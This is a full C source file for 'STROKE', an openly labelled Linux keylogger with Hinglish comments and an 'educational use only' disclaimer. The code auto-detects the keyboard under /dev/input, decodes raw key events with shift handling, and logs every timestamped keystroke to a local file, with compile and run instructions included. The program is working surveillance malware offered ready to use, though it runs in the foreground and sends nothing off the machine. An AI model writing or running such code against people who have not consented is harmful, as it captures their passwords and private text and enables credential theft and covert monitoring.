/*
 *============================================================================
 *
 *              ╔══════════════════════════════════════╗
 *              ║   ╻ ╻╻ ╻┏━╸┏━┓┏━╸┏━┓                 ║
 *              ║   ┃┃┃┃┏┛┣╸ ┣┳┛┣╸ ┗┓┓                 ║
 *              ║   ╹┗┛┗┛┗━╸╹┗╸┗━╸┗━┛                  ║
 *              ║      ┏━┓┏━┓╻ ╻┏━╸┏━┓╻  ╻             ║
 *              ║      ┣┓┛┃ ┃┃ ┃┣╸ ┣┳┛┃  ┃             ║
 *              ║      ┗┛┛┗━┛╹ ╹╹  ╹┗╸╹  ╹             ║
 *              ║                                      ║
 *              ║          _                           ║
 *              ║         | |                          ║
 *              ║      ___| |_ _ __ ___   ___ ___      ║
 *              ║     / __| __| '__/ _ \ / __/ __|     ║
 *              ║     \__ \ |_| | | (_) | (__\__ \     ║
 *              ║     |___/\__|_|  \___/ \___|___/     ║
 *              ║                                      ║
 *              ║     STROKE — Linux Keylogger         ║
 *              ╚══════════════════════════════════════╝
 *        "Every stroke tells a story. Listen to the keys."
 *        For educational use only. Test in controlled environments.
 *
 *        Compile: gcc -o stroke stroke.c
 *        Run:     ./stroke [/dev/input/eventX]
 *
 *============================================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <linux/input-event-codes.h>
#include <signal.h>
#include <time.h>
#include <dirent.h>

#define LOG_FILE "keystrokes.log"  // Jis file mein logs store honge

volatile sig_atomic_t running = 1;  // Yeh flag batata hai ke program chal raha hai ya nahi

// Ctrl+C dabaane par yeh function call hota hai
// Basically gracefully exit karne k liye hai
void handle_signal(int sig) {
    (void)sig;
    running = 0;  // Flag ko zero kar do, loop break hojayega
}

// Yeh function Linux key code ko character mein convert karta hai
// actually Linux ka key codes alphabetical order mein nahi hain, big problem!
// Isliye humne manual mapping kar di hai, theek hai.
char keycode_to_char(int code, int shift) {
    // Normal keys ka mapping — jab shift pressed nahi hai
    static const char key_map[256] = {
        [KEY_1]     = '1',  [KEY_2]   = '2',  [KEY_3]   = '3',
        [KEY_4]     = '4',  [KEY_5]   = '5',  [KEY_6]   = '6',
        [KEY_7]     = '7',  [KEY_8]   = '8',  [KEY_9]   = '9',
        [KEY_0]     = '0',
        [KEY_Q]     = 'q',  [KEY_W]   = 'w',  [KEY_E]   = 'e',
        [KEY_R]     = 'r',  [KEY_T]   = 't',  [KEY_Y]   = 'y',
        [KEY_U]     = 'u',  [KEY_I]   = 'i',  [KEY_O]   = 'o',
        [KEY_P]     = 'p',  [KEY_A]   = 'a',  [KEY_S]   = 's',
        [KEY_D]     = 'd',  [KEY_F]   = 'f',  [KEY_G]   = 'g',
        [KEY_H]     = 'h',  [KEY_J]   = 'j',  [KEY_K]   = 'k',
        [KEY_L]     = 'l',  [KEY_Z]   = 'z',  [KEY_X]   = 'x',
        [KEY_C]     = 'c',  [KEY_V]   = 'v',  [KEY_B]   = 'b',
        [KEY_N]     = 'n',  [KEY_M]   = 'm',
        [KEY_SPACE] = ' ',  [KEY_TAB] = '\t', [KEY_ENTER] = '\n',
        [KEY_DOT]  = '.',   [KEY_COMMA] = ',', [KEY_SLASH] = '/',
        [KEY_SEMICOLON] = ';', [KEY_APOSTROPHE] = '\'',
        [KEY_MINUS] = '-',  [KEY_EQUAL] = '=',
        [KEY_BACKSLASH] = '\\', [KEY_LEFTBRACE] = '[',
        [KEY_RIGHTBRACE] = ']', [KEY_GRAVE] = '`',
        [KEY_BACKSPACE] = '\b',
    };

    // Shift pressed hai toh yeh mapping use hoga
    // Capital letters aur symbols k liye alag mapping
    static const char shift_map[256] = {
        [KEY_1]     = '!',  [KEY_2]   = '@',  [KEY_3]   = '#',
        [KEY_4]     = '$',  [KEY_5]   = '%',  [KEY_6]   = '^',
        [KEY_7]     = '&',  [KEY_8]   = '*',  [KEY_9]   = '(',
        [KEY_0]     = ')',
        [KEY_Q]     = 'Q',  [KEY_W]   = 'W',  [KEY_E]   = 'E',
        [KEY_R]     = 'R',  [KEY_T]   = 'T',  [KEY_Y]   = 'Y',
        [KEY_U]     = 'U',  [KEY_I]   = 'I',  [KEY_O]   = 'O',
        [KEY_P]     = 'P',  [KEY_A]   = 'A',  [KEY_S]   = 'S',
        [KEY_D]     = 'D',  [KEY_F]   = 'F',  [KEY_G]   = 'G',
        [KEY_H]     = 'H',  [KEY_J]   = 'J',  [KEY_K]   = 'K',
        [KEY_L]     = 'L',  [KEY_Z]   = 'Z',  [KEY_X]   = 'X',
        [KEY_C]     = 'C',  [KEY_V]   = 'V',  [KEY_B]   = 'B',
        [KEY_N]     = 'N',  [KEY_M]   = 'M',
        [KEY_DOT]  = '>',   [KEY_COMMA] = '<', [KEY_SLASH] = '?',
        [KEY_SEMICOLON] = ':', [KEY_APOSTROPHE] = '"',
        [KEY_MINUS] = '_',  [KEY_EQUAL] = '+',
        [KEY_BACKSLASH] = '|', [KEY_LEFTBRACE] = '{',
        [KEY_RIGHTBRACE] = '}', [KEY_GRAVE] = '~',
    };

    // Agar code valid range mein hai toh mapping se character lo
    if (code >= 0 && code < 256) {
        if (shift && shift_map[code]) return shift_map[code];
        if (key_map[code]) return key_map[code];
    }
    return 0;  // Agar mapping nahi mili toh zero return karo
}

// Check karo ke yeh shift key hai ya nahi
// left shift aur right shift dono ko handle karna hai
int is_shift_key(int code) {
    return code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT;
}

// Yeh function automatically keyboard device dhundhta hai
// /dev/input/ mein saare event devices scan karta hai
// Jis mein "keyboard" word hai aur EV_KEY support hai, woh select karo
int find_keyboard_device(char *path, size_t path_size) {
    DIR *dir = opendir("/dev/input");
    if (!dir) return -1;  // Agar directory open nahi hui toh fail

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        // Sirff event* wale files check karo, baaki skip
        if (strncmp(entry->d_name, "event", 5) != 0) continue;

        char check_path[512];
        snprintf(check_path, sizeof(check_path), "/dev/input/%s", entry->d_name);

        int fd = open(check_path, O_RDONLY);
        if (fd < 0) continue;  // Agar open nahi ho sakta toh skip karo

        // Device ka name pata karo
        char name[256] = {0};
        if (ioctl(fd, EVIOCGNAME(sizeof(name)), name) < 0) {
            close(fd);
            continue;
        }

        // Check karo ke device EV_KEY events support karta hai ya nahi
        unsigned long ev_bits = 0;
        if (ioctl(fd, EVIOCGBIT(0, sizeof(ev_bits)), &ev_bits) < 0) {
            close(fd);
            continue;
        }

        close(fd);

        // Agar EV_KEY bit set hai aur name mein "keyboard" hai toh yeh hamara device hai
        // lowercase "keyboard" ya "Keyboard" dono check karo, kyunki Linux kuch bhi kar sakta hai
        if ((ev_bits & (1 << EV_KEY)) && (strstr(name, "keyboard") || strstr(name, "Keyboard"))) {
            snprintf(path, path_size, "%s", check_path);
            printf("[*] Auto-detected keyboard: %s (%s)\n", check_path, name);
            closedir(dir);
            return 0;  // Successfully mil gaya device
        }
    }

    closedir(dir);
    return -1;  // Koi keyboard device nahi mila yaar
}

void print_banner(void) {
    printf("\n");
    printf("  ╔══════════════════════════════════════╗\n");
    printf("  ║   ╻ ╻╻ ╻┏━╸┏━┓┏━╸┏━┓                 ║\n");
    printf("  ║   ┃┃┃┃┏┛┣╸ ┣┳┛┣╸ ┗┓┓                 ║\n");
    printf("  ║   ╹┗┛┗┛┗━╸╹┗╸┗━╸┗━┛                  ║\n");
    printf("  ║      ┏━┓┏━┓╻ ╻┏━╸┏━┓╻  ╻             ║\n");
    printf("  ║      ┣┓┛┃ ┃┃ ┃┣╸ ┣┳┛┃  ┃             ║\n");
    printf("  ║      ┗┛┛┗━┛╹ ╹╹  ╹┗╸╹  ╹             ║\n");
    printf("  ║                                      ║\n");
    printf("  ║          _                           ║\n");
    printf("  ║         | |                          ║\n");
    printf("  ║      ___| |_ _ __ ___   ___ ___      ║\n");
    printf("  ║     / __| __| '__/ _ \\ / __/ __|     ║\n");
    printf("  ║     \\__ \\ |_| | | (_) | (__\\__ \\     ║\n");
    printf("  ║     |___/\\__|_|  \\___/ \\___|___/     ║\n");
    printf("  ║                                      ║\n");
    printf("  ║     STROKE — Linux Keylogger         ║\n");
    printf("  ╚══════════════════════════════════════╝\n");
    printf("  \"Every stroke tells a story — listen to the keys.\"\n\n");
}

int main(int argc, char *argv[]) {
    char dev_path[512];
    FILE *log_fp;
    struct input_event ev;
    int shift_pressed = 0;  // Shift pressed hai ya nahi, initially false

    // Pehle banner dikhao, phir kaam shuru karo
    print_banner();

    // Ctrl+C handle karne k liye signal set karo
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    // Keyboard device decide karo — user ne diya hai ya auto-detect karo
    if (argc > 1) {
        snprintf(dev_path, sizeof(dev_path), "%s", argv[1]);
    } else if (find_keyboard_device(dev_path, sizeof(dev_path)) != 0) {
        fprintf(stderr, "[-] No keyboard device found. Specify: %s /dev/input/eventX\n", argv[0]);
        return 1;
    }

    // Device ko open karo
    int fd = open(dev_path, O_RDONLY);
    if (fd < 0) {
        perror("[-] Failed to open device");
        fprintf(stderr, "    Try: sudo %s %s\n", argv[0], dev_path);
        return 1;
    }

    printf("[*] Logging to: %s\n", LOG_FILE);
    printf("[*] Press Ctrl+C to stop\n\n");

    // Log file ko append mode mein open karo
    log_fp = fopen(LOG_FILE, "a");
    if (!log_fp) {
        perror("[-] Failed to open log file");
        close(fd);
        return 1;
    }

    // Session start ka time log karo
    time_t now = time(NULL);
    fprintf(log_fp, "\n=== Session started: %s", ctime(&now));
    fflush(log_fp);

    // Main loop — continuously events read karo
    while (running) {
        ssize_t bytes = read(fd, &ev, sizeof(ev));
        if (bytes < (ssize_t)sizeof(ev)) continue;  // Invalid event, skip karo

        // Agar EV_KEY event hai aur key pressed hai (value == 1)
        if (ev.type == EV_KEY && ev.value == 1) {
            // Shift key hai toh flag set karo aur continue karo
            if (is_shift_key(ev.code)) {
                shift_pressed = 1;
                continue;
            }

            // Timestamp generate karo
            time_t t = time(NULL);
            struct tm *tm_info = localtime(&t);
            char ts[20];
            strftime(ts, sizeof(ts), "%H:%M:%S", tm_info);

            // Key code ko character mein convert karo
            char c = keycode_to_char(ev.code, shift_pressed);
            if (c) {
                // Special keys ko alag tarah se handle karo
                if (c == '\n') {
                    printf("[%s] [ENTER]\n", ts);
                    fprintf(log_fp, "[%s] [ENTER]\n", ts);
                } else if (c == '\b') {
                    printf("[%s] [BACKSPACE]\n", ts);
                    fprintf(log_fp, "[%s] [BACKSPACE]\n", ts);
                } else if (c == '\t') {
                    printf("[%s] [TAB]\n", ts);
                    fprintf(log_fp, "[%s] [TAB]\n", ts);
                } else {
                    printf("[%s] %c\n", ts, c);
                    fprintf(log_fp, "[%s] %c\n", ts, c);
                }
                fflush(log_fp);
            } else {
                // Agar mapping nahi mili (like F1, F2 etc.) toh key code print karo
                // Taake analysis kar sako ke kaun sa key press hua hai
                printf("[%s] [KEY_%d]\n", ts, ev.code);
                fprintf(log_fp, "[%s] [KEY_%d]\n", ts, ev.code);
            }
        } else if (ev.type == EV_KEY && ev.value == 0) {
            // Key released — shift key hai toh flag reset karo
            if (is_shift_key(ev.code)) {
                shift_pressed = 0;
            }
        }
    }

    // Cleanup — session end time log karo aur files close karo
    now = time(NULL);
    fprintf(log_fp, "=== Session ended: %s\n", ctime(&now));

    printf("\n[!] Keylogger stopped.\n");
    printf("[+] Keystrokes saved to: %s\n", LOG_FILE);

    fclose(log_fp);
    close(fd);
    return 0;
}
